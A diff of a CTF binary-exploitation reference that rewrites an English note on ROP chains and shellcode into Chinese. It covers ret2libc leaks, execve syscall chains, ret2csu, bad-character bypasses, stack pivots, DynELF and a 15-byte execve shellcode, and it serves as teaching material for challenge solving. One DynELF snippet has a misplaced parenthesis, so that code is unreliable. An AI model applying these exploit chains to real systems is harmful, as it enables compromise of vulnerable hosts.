@@ -1,659 +1,339 @@
-# CTF Pwn - ROP Chains and Shellcode
-
-## Table of Contents
-- [ROP Chain Building](#rop-chain-building)
-  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak--shell)
-  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
-  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
-  - [Shell Interaction After execve](#shell-interaction-after-execve)
-- [ret2csu — __libc_csu_init Gadgets (Crypto-Cat)](#ret2csu--__libc_csu_init-gadgets-crypto-cat)
-- [Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
-- [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)](#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat)
-  - [64-bit: BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
-  - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
-- [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
-- [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
-- [DynELF Automated Libc Discovery (RC3 CTF 2016)](#dynelf-automated-libc-discovery-rc3-ctf-2016)
-- [Constrained Shellcode in Small Buffers (TUM CTF 2016)](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
-- [Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
-- [Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
-- [Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)
-- [stub_execveat Syscall as execve Alternative (ASIS CTF 2018)](#stub_execveat-syscall-as-execve-alternative-asis-ctf-2018)
-- [Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)](#alphanumeric-shellcode-bootstrap-via-pushpop-when-rax0-nullcon-hackim-2019)
-
-For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [[binary/漏洞利用/rop-advanced.md|rop-advanced.md]].
-
 ---
 
-## ROP Chain Building
+phase: binary
+vuln_class: [pwn, rop, ret2libc, shellcode, stack-pivot, ret2csu]
+title: ROP 与 shellcode
+summary: 卡点决定手法——没 libc 就两阶段泄、没 gadget 就 ret2csu 或冷门指令、有坏字符就编码或 sprintf 逐字节拼、空间太小就压 shellcode 或枢轴换栈。
+---
+
+# ROP 与 shellcode
+
+溢出点与偏移见 [[binary/漏洞利用/overflow-basics.md|栈与基础溢出]]；原语查表见 [[binary/漏洞利用/field-notes.md|原语速查表]]；SROP/双枢轴/`retf` 换架构见 [[binary/漏洞利用/rop-advanced.md|ROP 进阶]]；总览见 [[binary/漏洞利用/index.md|漏洞利用总览]]。
+
+## 0. 判据速查
+
+| 卡在哪 | 首选手法 | 去哪节 |
+|---|---|---|
+| 不知道 libc 版本 | 两阶段：`puts@plt` 泄 GOT → 重入 → 打一发 | §1 |
+| 泄完回不到第二次输入 | 返回 `main` 里 `call vuln` 那条指令 | §1 |
+| 泄出来的字节前面粘了别的输出 | `printf` 没尾换行，`recvuntil` 前缀再 `recvline` | §1 |
+| 调 `system()`/`execve()` 就 SIGSEGV | 走裸 `syscall`，绕过 libc 序言与 CET | §2 |
+| 找不到 `pop rdx; ret` | 找 `pop rdx; pop rbx; ret`（glibc 2.35 约 `0x904a9`） | §2 |
+| 调完 `puts` 后 `rdx` 被踩成 1 | 三种解法：libc gadget / 重入 `read` / `leave` 枢轴 | §3 |
+| 二进制里一个 `pop rdx` 都没有 | `__libc_csu_init` 两段 gadget | §4 |
+| payload 不能含 null/换行/空格 | XOR 编码后原地解，或 `sprintf` 逐字节拼 | §5 |
+| 连 `mov [reg],reg` 都没有 | `BEXTR`+`XLAT`+`STOSB` / `PEXT` | §5 |
+| 缓冲区装不下整条链 | `xchg rax,esp` 枢轴（注意 32 位截断） | §6 |
+| 远程 libc 未知且能任意读 | pwntools `DynELF` | §7 |
+| shellcode 只剩 15 字节 | `cdq` + `push/pop` 压缩，先审入口寄存器 | §8 |
+| 需要 `rdx=0` 但没 gadget | canary 校验尾声 `xor rdx, fs:28h` | §9.1 |
+| 8 字节且每字节唯一 | `syscall` 把 RIP 存进 RCX 当自定位 | §9.2 |
+| 没有 `pop rax` 但只有 `read` | 让 `read` 正好返回 `0x142` → `stub_execveat` | §9.3 |
+| 只允许字母数字 | 3 字节 `push r12; pop rax` 播种，再交给编码器 | §9.4 |
+| 拿到 shell 后命令被吃掉 | `sleep(1)` 再 `sendline`，别用 stdin 管道 | §10 |
+
+## 1. 两阶段 ret2libc
+
+第一阶段只做一件事：把某个 libc 函数的真实地址打到 stdout。第二阶段用算出的基址重新打一次。
 
 ```python
-from pwn import *
-
-elf = ELF('./binary')
-libc = ELF('./libc.so.6')
-rop = ROP(elf)
-
-# Common gadgets
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret = rop.find_gadget(['ret'])[0]
-
-# Leak libc
-payload = flat(
-    b'A' * offset,
-    pop_rdi,
-    elf.got['puts'],
-    elf.plt['puts'],
-    elf.symbols['main']
-)
-```
-
-### Two-Stage ret2libc (Leak + Shell)
-
-When exploiting in two stages, choose the return target for stage 2 carefully:
-
-```python
-# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
-payload1 = b'A' * offset
-payload1 += p64(pop_rdi)
-payload1 += p64(elf.got['puts'])
+payload1  = b'A' * offset
+payload1 += p64(pop_rdi) + p64(elf.got['puts'])
 payload1 += p64(elf.plt['puts'])
-payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main
-
-# IMPORTANT: Return target after leak
-# - Returning to main may crash if check_status/setup corrupts stack
-# - Returning to vuln directly may have stack issues
-# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
-#   This sets up a clean stack frame via the CALL instruction
+payload1 += p64(CALL_VULN_ADDR)      # ← 关键
 ```
 
-**Leak parsing with no-newline printf:**
+**返回目标的选择是这一步唯一的坑**：回 `main` 可能被 `check_status`/`setup` 之类的初始化把栈或全局状态弄脏；直接回 `vuln` 函数入口往往栈不平衡。**正解是回 `main` 里 `call vuln` 那条指令**（`objdump -d` 找，如 `0x401239`）——`CALL` 会重新压返回地址、建立干净栈帧，等价于「程序自己又调了一次漏洞函数」。
+
+**没有尾换行的泄漏解析**：`printf("Laundry complete")` 不带 `\n` 时，`puts()` 泄出的 6 字节紧贴在同一行：
+
 ```python
-# If printf("Laundry complete") has no trailing newline,
-# puts() leak appears right after it on the same line:
-# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
 p.recvuntil(b'Laundry complete')
-leaked = p.recvline().strip()
-libc_addr = u64(leaked.ljust(8, b'\x00'))
+leaked = p.recvline().strip()        # 只有这 6 字节
+libc.address = u64(leaked.ljust(8, b'\x00')) - libc.sym['puts']
 ```
 
-### Raw Syscall ROP (When system() Fails)
+用 `recvline()` 而不 `recv(6)` 也行，但必须先吃掉前缀，否则 `u64` 会读到 `e` 和空格。
 
-If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:
+## 2. 裸 syscall ROP
+
+`system()` 和 `execve()` 都走 libc 函数序言：可能踩栈对齐、可能被 CET/IBT 拦。裸 `syscall` 指令绕过全部序言，是最稳的兜底。
 
 ```python
-# Find gadgets in libc
 libc_rop = ROP(libc)
-pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
-pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
-pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
-syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]
+pop_rax      = libc_rop.find_gadget(['pop rax', 'ret'])[0]
+pop_rdx_rbx  = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
 
-# execve("/bin/sh", NULL, NULL) = syscall 59
-payload = b'A' * offset
-payload += p64(libc_base + pop_rax)
-payload += p64(59)
-payload += p64(libc_base + pop_rdi)
-payload += p64(libc_base + next(libc.search(b'/bin/sh')))
-payload += p64(libc_base + pop_rsi)
-payload += p64(0)
-payload += p64(libc_base + pop_rdx_rbx)
-payload += p64(0)
-payload += p64(0)  # rbx junk
-payload += p64(libc_base + syscall_ret)
+payload  = b'A' * offset
+payload += flat(pop_rax, 59,                                   # execve
+                pop_rdi, libc_base + next(libc.search(b'/bin/sh')),
+                pop_rsi, 0,
+                pop_rdx_rbx, 0, 0,                             # rdx=0, rbx 垃圾
+                libc_base + syscall_ret)
 ```
 
-**When to use raw syscall vs libc functions:**
-- `system()` through libc: simplest, but may crash due to stack alignment or CET
-- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
-- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
-- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead
+**`pop rdx; ret` 在现代 libc 里基本不存在**，别浪费时间搜；直接找带副作用的 `pop rdx; pop rbx; ret`。同理 `pop rsi` 后面常粘 `pop r15`。
 
-### rdx Control in ROP Chains
+## 3. `rdx` 控制的三种解法
 
-After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.
+调过 `puts`/`printf` 之后 `rdx` 常被踩成 1，后面所有 `read(fd, buf, rdx)` 都只读 1 字节。
 
-**Solutions:**
-1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
-2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
+1. **libc gadget**：`pop rdx; pop rbx; ret`，多喂一个垃圾值。
+2. **重入二进制的 `read` 设置段**：跳到 `lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read` 这条链的中段，先 `pop rbp` 把 `rbp-0x40` 对准目标缓冲区。
+
    ```python
-   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
-   # Set rbp first so rbp-0x40 points to target buffer:
-   POP_RBP_RET = 0x40113d
-   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
-
-   payload += p64(POP_RBP_RET)
-   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
+   payload += p64(POP_RBP_RET) + p64(TARGET_ADDR + 0x40)
    payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
-   # WARNING: After read, code continues to printf + leave;ret
-   # leave sets rsp=rbp, so you get a stack pivot to rbp!
    ```
-3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
 
-### Shell Interaction After execve
+3. **顺手拿 `leave;ret` 做枢轴**：第 2 种做法里 `read` 之后紧接着 `printf` + `leave;ret`，`leave` 会把 `rsp = rbp`——于是 `read` 进来的数据里 `rbp+8` 开始就是下一段链。等于一次调用同时拿到「写内存」和「换栈」。
 
-After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.
+## 4. ret2csu
 
-```python
-p.send(payload)  # Trigger execve
+二进制里没有 `pop rdx`，但 `__libc_csu_init` 几乎在所有动态链接 ELF 里存在，且提供两段：
 
-# Wait for shell to initialize before sending commands
-import time
-time.sleep(1)
-p.sendline(b'id')
-time.sleep(0.5)
-result = p.recv(timeout=3)
-
-# For flag retrieval:
-p.sendline(b'cat /flag* flag* 2>/dev/null')
-time.sleep(0.5)
-flag = p.recv(timeout=3)
-
-# DON'T pipe commands via stdin when using pwntools - they get consumed
-# by earlier read() calls. Use explicit sendline() after delays instead.
-```
-
-## ret2csu — __libc_csu_init Gadgets (Crypto-Cat)
-
-**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.
-
-**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
 ```asm
-pop rbx        ; 0
-pop rbp        ; 1
-pop r12        ; function pointer (address of GOT entry)
-pop r13        ; edi value
-pop r14        ; rsi value
-pop r15        ; rdx value
+; gadget 1：弹参数
+pop rbx        ; 填 0
+pop rbp        ; 填 1
+pop r12        ; 要调的函数指针（通常填 GOT 项地址）
+pop r13        ; → edi
+pop r14        ; → rsi
+pop r15        ; → rdx
 ret
+
+; gadget 2：搬运并调用
+mov rdx, r15
+mov rsi, r14
+mov edi, r13d
+call qword ptr [r12 + rbx*8]
 ```
 
-**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
+用法：gadget 1 弹满 6 个值 → gadget 2 搬进寄存器 → `call [r12+rbx*8]`。**`rbx` 必须是 0，`rbp` 必须是 1**，否则 `call` 之后那段 `add rbx,1; cmp rbp,rbx; jne` 循环会跑飞。填 `r12 = GOT['puts']` 就是 `call puts@plt` 的效果，不需要 PLT 地址。
+
+代价：一次只能设 3 个参数，且中间要吞掉 7 个 qword 的栈槽。只在真没别的 gadget 时用。
+
+## 5. 坏字符绕过
+
+### 5.1 XOR 编码后原地解
+
+需要往内存写 `"/bin/sh"` 或 `"flag.txt"`，但 payload 过滤 null/换行。
+
 ```asm
-mov rdx, r15   ; rdx = r15
-mov rsi, r14   ; rsi = r14
-mov edi, r13d  ; edi = r13 (32-bit!)
-call [r12 + rbx*8]  ; call function pointer
-add rbx, 1
-cmp rbp, rbx
-jne .loop      ; loop if rbx != rbp
-; falls through to gadget 1 pop chain
+pop r14; pop r15; ret          ; r14 = 密钥, r15 = 目标地址
+mov [r15], r14; ret            ; 写入编码值
+xor [r15], r14; ret            ; 原地解回
 ```
 
-**Exploit pattern:**
 ```python
-csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
-csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL
-
-payload = flat(
-    b'A' * offset,
-    csu_pop,
-    0,            # rbx = 0 (index)
-    1,            # rbp = 1 (loop count, must equal rbx+1)
-    elf.got['puts'],  # r12 = function to call (GOT entry)
-    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
-    0xcafebabe,   # r14 → rsi (second arg)
-    0x12345678,   # r15 → rdx (third arg)
-    csu_call,     # trigger mov + call
-    b'\x00' * 56, # padding for the 7 pops after call returns
-    next_gadget,  # return address after csu completes
-)
-```
-
-**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.
-
-**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.
-
----
-
-## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)
-
-**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).
-
-**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.
-
-**Required gadgets:**
-```asm
-pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
-xor [r15], r14; ret            ; XOR memory at r15 with r14
-mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
-```
-
-**Exploit pattern:**
-```python
-data_section = elf.symbols['__data_start']  # or .data address
-xor_key = 2  # simple key that removes bad chars
-
-def xor_bytes(data, key):
-    return bytes(b ^ key for b in data)
-
-target = b"flag.txt"
-encoded = xor_bytes(target, xor_key)
-
-payload = b'A' * offset
-
-# Write XOR'd data in 8-byte chunks
+encoded = bytes(b ^ KEY for b in target)
 for i in range(0, len(encoded), 8):
-    chunk = encoded[i:i+8].ljust(8, b'\x00')
-    payload += flat(
-        pop_r14_r15,
-        chunk,                    # XOR'd data
-        data_section + i,         # destination address
-        mov_r15_r14,              # write to memory
-    )
-
-# XOR each chunk back to recover original
+    payload += flat(pop_r14_r15, encoded[i:i+8].ljust(8, b'\x00'),
+                    data_sec + i, mov_r15_r14)
 for i in range(0, len(target), 8):
-    payload += flat(
-        pop_r14_r15,
-        p64(xor_key),             # XOR key
-        data_section + i,         # target address
-        xor_r15_r14,              # decode in place
-    )
-
-# Now data_section contains "flag.txt" — use it as argument
-payload += flat(pop_rdi, data_section, elf.plt['print_file'])
+    payload += flat(pop_r14_r15, p64(KEY), data_sec + i, xor_r15_r14)
+payload += flat(pop_rdi, data_sec, elf.plt['print_file'])
 ```
 
-**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.
+XOR 自逆（`a^k^k == a`），所以写入和解码可以是同一段 gadget。密钥不一定要全局统一——逐字节解方程：每个位置找任意一个 `key` 使 `orig ^ key` 落在白名单内。
 
----
+### 5.2 `sprintf` 逐字节拼（PlaidCTF 2013）
 
-## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)
-
-**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.
-
-### 64-bit: BEXTR + XLAT + STOSB
-
-**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.
+`sprintf(dst, src)` 遇 null 停止，所以当 `src` 指向「一个目标字节 + `\x00`」时等效单字节拷贝。源地址直接取自二进制自己的 `.text`/`.rodata`——那些字节天然不含坏字符。
 
 ```python
-# Gadgets from questionableGadgets section of binary
-xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
-bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
-                                                     # bextr rbx, rcx, rdx; ret
-stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret
+byte_addrs = {}
+for c in range(256):
+    for i in range(len(exe_data)):
+        if exe_data[i] == c and not has_bad_chars(p32(exe_base + i)):
+            byte_addrs[c] = exe_base + i
+            break
 
-data_section = elf.symbols.__data_start
-
-# Write "flag.txt" byte by byte
-for i, char in enumerate(b"flag.txt"):
-    # Find address of char in binary's read-only data
-    char_addr = next(elf.search(bytes([char])))
-
-    # BEXTR extracts rbx from rcx using rdx as control
-    # rcx = char_addr - 0x3ef2 (compensate for add)
-    # rdx = 0x4000 (extract 64 bits starting at bit 0)
-    payload += flat(
-        bextr_ret,
-        0x4000,                    # rdx (BEXTR control: start=0, len=64)
-        char_addr - 0x3ef2,        # rcx (offset compensated)
-        xlat_ret,                  # al = byte at [rbx + al]
-        pop_rdi,
-        data_section + i,
-        stosb_ret,                 # [rdi] = al; rdi++
-    )
+for i, byte in enumerate(shellcode):
+    rop += flat(sprintf_plt, pop3ret, bss + i, byte_addrs[byte], 0)
+rop += p32(bss)
 ```
 
-### 32-bit: PEXT (Parallel Bits Extract)
+必须有一个 `pop3ret`（32 位下清 3 个参数槽）。整条链长度 = `shellcode 长度 × 5` 个指针，空间要够。
 
-**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.
+### 5.3 冷门指令当写原语
+
+标准 `mov [reg], reg` 不存在时，x86 还有一批「一辈子用不上」的指令能拼出字节写：
+
+**64 位：`BEXTR` + `XLAT` + `STOSB`**
 
 ```python
-# Gadgets
-pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
-                                                      # pext edx,ebx,eax; ...ret
-bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
-xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret
+xlat_ret  = questionableGadgets          # xlat byte ptr [rbx]; ret   → al = [rbx+al]
+bextr_ret = questionableGadgets + 2      # pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx,rcx,rdx; ret
+stosb_ret = questionableGadgets + 17     # stosb byte ptr [rdi], al; ret  → [rdi]=al, rdi++
 
-# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
+for i, ch in enumerate(b"flag.txt"):
+    char_addr = next(elf.search(bytes([ch])))
+    payload += flat(bextr_ret,
+                    0x4000,                 # rdx: 从第 0 位取 64 位
+                    char_addr - 0x3ef2,     # 补偿 gadget 里的 add
+                    xlat_ret,               # al = [rbx + al]
+                    pop_rdi, data_sec + i,
+                    stosb_ret)
+```
+
+`BEXTR` 在这里的作用只是把「某个地址」塞进 `rbx`，`XLAT` 才是取字节的那一步，`STOSB` 负责落盘并自增指针。三段串起来就是「按地址取一字节写到目标」。
+
+**32 位：`PEXT`**
+
+`PEXT(src, mask)` 按 mask 选位并压紧，所以只要算出一个 mask 让 `PEXT(0xb0bababa, mask)` 等于目标字节即可。配 `bswap` + `xchg [ecx], dl` 完成写入。
+
+```python
 def find_mask(target_byte, source=0xb0bababa):
-    """Find 32-bit mask that extracts target_byte from source via PEXT."""
-    source_bits = [(source >> i) & 1 for i in range(32)]
-    target_bits = [(target_byte >> i) & 1 for i in range(8)]
-    # Select 8 bits from source that match target bits
-    mask = 0
-    matched = 0
+    sb = [(source >> i) & 1 for i in range(32)]
+    tb = [(target_byte >> i) & 1 for i in range(8)]
+    mask, matched = 0, 0
     for i in range(32):
-        if matched < 8 and source_bits[i] == target_bits[matched]:
-            mask |= (1 << i)
-            matched += 1
+        if matched < 8 and sb[i] == tb[matched]:
+            mask |= (1 << i); matched += 1
     return mask if matched == 8 else None
 ```
 
-**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.
+## 6. 栈枢轴
 
----
+缓冲区装不下整条链，但程序泄了一个堆/栈地址且那处有可控数据。
 
-## Stack Pivot via xchg rax,esp (Crypto-Cat)
-
-**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.
-
-**Two-stage pattern:**
 ```python
-# Stage 1: Program provides a heap address where it wrote user data
-pivot_addr = int(io.recvline(), 16)
-
-# Prepare ROP chain at the pivot address (via earlier input)
-stage2_rop = flat(
-    pop_rdi, elf.got['puts'],
-    elf.plt['puts'],             # leak libc
-    elf.symbols['main'],         # return to main for stage 3
-)
-io.send(stage2_rop)             # Written to pivot_addr by program
-
-# Stage 2: Overflow with stack pivot
-xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
-pop_rax = elf.symbols.usefulGadgets            # pop rax; ret
-
-payload = flat(
-    b'A' * offset,
-    pop_rax,
-    pivot_addr,         # load pivot address into rax
-    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
-)
+payload = flat(b'A' * offset,
+               pop_rax, pivot_addr,
+               xchg_rax_esp)      # rsp ↔ esp
 ```
 
-**Why xchg vs. leave;ret:**
-- `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
-- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
-- `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)
+**`xchg rax, esp` 在 x86-64 上把 `rsp` 高 32 位清零**（`esp` 只有 32 位）。所以 pivot 地址必须落在低 4GB：堆、`mmap` 区通常满足；栈地址（`0x7fff...`）一定不满足，用了必崩。
 
-**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.
+与 `leave;ret` 的分工：`leave` 要控 `rbp`，`xchg` 要控 `rax`。小缓冲区溢出往往碰不到保存的 `rbp`，此时 `xchg` 是唯一选择。
 
----
+## 7. DynELF
 
-## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)
-
-**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.
+远程 libc 版本未知，但有一个能读任意地址的原语（格式串、或 `printf` + 重入）。
 
 ```python
-from pwn import *
-
-# Step 1: Scan executable for addresses containing each needed byte
-exe_data = open('binary', 'rb').read()
-byte_addrs = {}  # Maps byte value -> address in executable
-for c in range(256):
-    for i in range(len(exe_data)):
-        addr = exe_base + i
-        if exe_data[i] == c and not has_bad_chars(p32(addr)):
-            byte_addrs[c] = addr
-            break
-
-# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
-rop = b''
-for i, byte in enumerate(shellcode):
-    rop += p32(sprintf_plt)
-    rop += p32(pop3ret)           # Clean 3 args
-    rop += p32(bss_addr + i)     # Destination
-    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
-    rop += p32(0)                # Unused arg
-
-# Step 3: Jump to assembled shellcode on BSS
-rop += p32(bss_addr)
-```
-
-**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.
-
----
-
-## DynELF Automated Libc Discovery (RC3 CTF 2016)
-
-When the remote libc version is unknown, use pwntools' `DynELF` to resolve function addresses at runtime by leaking memory through a format string or read primitive.
-
-```python
-from pwn import *
-
-elf = ELF('./target')
-io = remote('target.ctf', 1337)
-
-# Define a leak function that reads memory at a given address
 def leak(addr):
-    payload = b'A' * offset
-    payload += p64(elf.plt['printf'])  # call printf to leak
-    payload += p64(main_addr)          # return to main for next leak
-    payload += p64(addr)               # argument: address to read
-    io.sendline(payload)
-    data = io.recvuntil(b'prompt', drop=True)
-    return data
+    p.sendline(flat(b'A' * offset, p64(elf.plt['printf'],
+                                       p64(main_addr), p64(addr))))
+    return p.recvuntil(b'prompt', drop=True)
 
-# DynELF resolves symbols by parsing ELF structures in memory
 d = DynELF(leak, elf=elf)
 system_addr = d.lookup('system', 'libc')
-binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string
-
-log.success(f"system @ {hex(system_addr)}")
-
-# Build final ROP chain with resolved addresses
-payload = b'A' * offset
-payload += p64(pop_rdi_ret)
-payload += p64(binsh_addr)
-payload += p64(system_addr)
-io.sendline(payload)
-io.interactive()
+binsh_addr  = d.lookup(None, 'libc')
 ```
 
-**Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.
+`DynELF` 自己解析 `.dynamic` → link_map → 符号表，不需要 libc 文件。代价是每次 `lookup` 都发很多次请求，慢；能拿到 libc 文件时优先直接对版本。
 
----
+## 8. 小空间 shellcode
 
-## Constrained Shellcode in Small Buffers (TUM CTF 2016)
-
-When shellcode space is severely limited (e.g., 15-16 bytes due to AES block size), use minimal register setup and avoid unnecessary instructions.
+### 8.1 15 字节 execve（TUM CTF 2016）
 
 ```asm
-; 15-byte execve("/bin/sh") shellcode for x86-64
-; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack
-; Written in fasm syntax:
-
-lea rdi, [rsp + 0x19]    ; 4 bytes - pointer to "/bin/sh" on stack
-cdq                       ; 1 byte  - rdx = 0 (envp = NULL)
-push rdx                  ; 1 byte  - NULL terminator for argv
-push rdi                  ; 1 byte  - argv[0] = "/bin/sh"
-push rsp                  ; 1 byte
-pop rsi                   ; 1 byte  - rsi = argv = {"/bin/sh", NULL}
-push 0x3b                 ; 2 bytes - syscall number for execve
-pop rax                   ; 1 byte  - rax = 59
-syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
-; Total: 15 bytes
-
-; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
-; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
+lea rdi, [rsp + 0x19]    ; 4  — "/bin/sh" 在 shellcode 之后的栈上
+cdq                      ; 1  — edx = 0（eax 符号扩展到 edx），比 xor edx,edx 省 1 字节
+push rdx                 ; 1  — argv 结尾 NULL
+push rdi                 ; 1  — argv[0]
+push rsp                 ; 1
+pop rsi                  ; 1  — rsi = argv
+push 0x3b                ; 2
+pop rax                  ; 1
+syscall                  ; 2
 ```
 
-**Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.
+压缩技巧只有两条：`cdq` 一字节清 `rdx`（前提 `eax` 非负）；`push reg; pop reg` 两字节代替 `mov` 三字节。
 
----
+### 8.2 AES 块约束
 
-## Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)
-
